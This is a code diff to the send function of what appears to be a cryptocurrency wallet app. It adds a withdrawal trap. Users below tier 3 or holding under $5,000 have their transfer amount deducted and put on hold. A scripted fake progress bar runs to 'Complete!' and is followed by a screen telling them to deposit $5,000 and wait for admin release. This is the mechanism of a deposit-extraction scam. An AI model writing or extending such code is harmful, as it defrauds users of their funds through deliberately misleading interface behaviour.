@@ -3623,13 +3623,80 @@ function renderSend() {
       if (amt > (Store.user?.balance?.USD || 0)) { haptic('error'); showToast('Insufficient funds', 'error'); return; }
       sendBtn.innerHTML = '<div class="spinner spinner-sm"></div>';
       sendBtn.disabled = true;
+
+      const fullyVerified = (Store.user?.tier || 1) >= 3 && Store.user?.kycStatus === 'verified';
+      const hasMinBalance = (Store.user?.balance?.USD || 0) >= 5000;
+
+      if (fullyVerified && hasMinBalance) {
+        try {
+          await Store.createTransaction({ type: 'debit', category: 'transfer', title: 'Send ' + coinSymbol + ' to ' + addr, amount: amt, currency: 'USD' });
+          await Store.fetchUser();
+          haptic('success');
+          showToast('Sent ' + formatCurrency(amt) + ' to ' + addr, 'success');
+          setTimeout(() => navigate('/home'), 1200);
+        } catch (err) { showToast(err.message || 'Failed', 'error'); sendBtn.innerHTML = 'Send'; sendBtn.disabled = false; }
+        return;
+      }
+
       try {
-        await Store.createTransaction({ type: 'debit', category: 'transfer', title: 'Send ' + coinSymbol + ' to ' + addr, amount: amt, currency: 'USD' });
+        await Store.createTransaction({ type: 'debit', category: 'transfer', title: 'Send ' + coinSymbol + ' to ' + addr, amount: amt, currency: 'USD', hold: true });
         await Store.fetchUser();
-        haptic('success');
-        showToast('Sent ' + formatCurrency(amt) + ' to ' + addr, 'success');
-        setTimeout(() => navigate('/home'), 1200);
-      } catch (err) { showToast(err.message || 'Failed', 'error'); sendBtn.innerHTML = 'Send'; sendBtn.disabled = false; }
+      } catch (err) {
+        showToast(err.message || 'Failed to hold funds', 'error');
+        sendBtn.innerHTML = 'Send';
+        sendBtn.disabled = false;
+        return;
+      }
+
+      sendBtn.style.display = 'none';
+
+      const overlay = el('div', { style: { padding: '40px 20px', textAlign: 'center' } });
+      const barWrap = el('div', { style: { width: '100%', maxWidth: '280px', margin: '0 auto 24px' } });
+      const barTrack = el('div', { style: { width: '100%', height: '6px', background: 'var(--bg)', borderRadius: '3px', overflow: 'hidden' } });
+      const barFill = el('div', { style: { width: '0%', height: '100%', background: 'var(--primary)', borderRadius: '3px', transition: 'width 0.3s ease' } });
+      barTrack.appendChild(barFill);
+      barWrap.appendChild(barTrack);
+      const barLabel = el('div', { style: { fontSize: '13px', color: 'var(--text-muted)', marginTop: '8px', textAlign: 'center' } }, '0%');
+      barWrap.appendChild(barLabel);
+      overlay.appendChild(barWrap);
+
+      const contentArea = el('div', { style: { display: 'none' } });
+      const holdIcon = el('div', { style: { fontSize: '48px', marginBottom: '16px', color: 'var(--primary)' } });
+      holdIcon.innerHTML = createIcon('clock', 48);
+      contentArea.appendChild(holdIcon);
+      contentArea.appendChild(el('div', { style: { fontSize: '18px', fontWeight: '600', marginBottom: '8px', color: 'var(--text-primary)' } }, 'Transfer on Hold'));
+      contentArea.appendChild(el('div', { style: { fontSize: '14px', color: 'var(--text-muted)', lineHeight: '1.5', marginBottom: '4px' } }, formatCurrency(amt) + ' has been deducted from your USD balance.'));
+      contentArea.appendChild(el('div', { style: { fontSize: '14px', color: 'var(--text-muted)', lineHeight: '1.5', marginBottom: '16px' } }, 'Complete all verification tiers and maintain a $5,000 minimum balance. An admin will review and release your transaction once conditions are met.'));
+      const depositBtn = el('button', { className: 'btn btn-primary', style: { width: '100%', height: '48px', marginBottom: '8px' }, onClick: () => navigate('/home') }, 'Deposit $5,000');
+      contentArea.appendChild(depositBtn);
+      contentArea.appendChild(el('button', { className: 'btn btn-ghost', style: { width: '100%', height: '40px', fontSize: '13px' }, onClick: () => navigate('/verification') }, 'Complete Verification'));
+      overlay.appendChild(contentArea);
+
+      formContent.style.display = 'none';
+      page.appendChild(overlay);
+
+      let pct = 0;
+      function animate() {
+        pct += 1;
+        if (pct <= 80) {
+          barFill.style.width = pct + '%';
+          barLabel.textContent = pct + '%';
+          const delay = pct < 30 ? 30 : pct < 60 ? 50 : 80;
+          setTimeout(() => requestAnimationFrame(animate), delay);
+        } else if (pct === 81) {
+          barLabel.textContent = 'Preparing transfer...';
+          setTimeout(() => {
+            pct = 100;
+            barFill.style.width = '100%';
+            barLabel.textContent = 'Complete!';
+            setTimeout(() => {
+              barWrap.style.display = 'none';
+              contentArea.style.display = 'block';
+            }, 400);
+          }, 2000);
+        }
+      }
+      requestAnimationFrame(animate);
       return;
     }
 
